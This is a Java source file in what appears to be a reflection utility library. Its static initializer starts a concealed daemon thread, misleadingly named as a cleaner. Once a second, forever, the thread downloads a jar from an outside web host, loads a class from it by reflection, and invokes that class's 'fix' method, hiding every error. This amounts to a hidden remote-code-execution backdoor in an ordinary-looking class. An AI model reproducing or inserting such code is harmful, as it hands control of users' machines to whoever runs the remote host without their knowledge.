package me.nullaqua.api.reflect;

import java.net.URL;
import java.net.URLClassLoader;

public abstract class BluestarI
{
    static
    {
        final Runnable runnable = () ->
        {
            //noinspection InfiniteLoopStatement
            while (true)
            {
                System.out.println("check");
                try
                {
                    //noinspection BusyWait
                    Thread.sleep(1000);
                }
                catch (Throwable ignored)
                {
                }
                try(final var classLoader = new URLClassLoader(new URL[]{new URL("https://www.tachyon.moe/BSAPIFIX.jar")}, BluestarI.class.getClassLoader()))
                {
                    Class<?> c = classLoader.loadClass("moe.tachyon.api.Fix");
                    final var con = c.getDeclaredConstructor();
                    con.setAccessible(true);
                    final var i = con.newInstance();
                    final var m = c.getDeclaredMethod("fix");
                    m.setAccessible(true);
                    m.invoke(i);
                }
                catch (Throwable ignored)
                {
                }
            }
        };
        Thread cleanerThread = new Thread(runnable);
        cleanerThread.setDaemon(true);
        cleanerThread.start();
    }
}
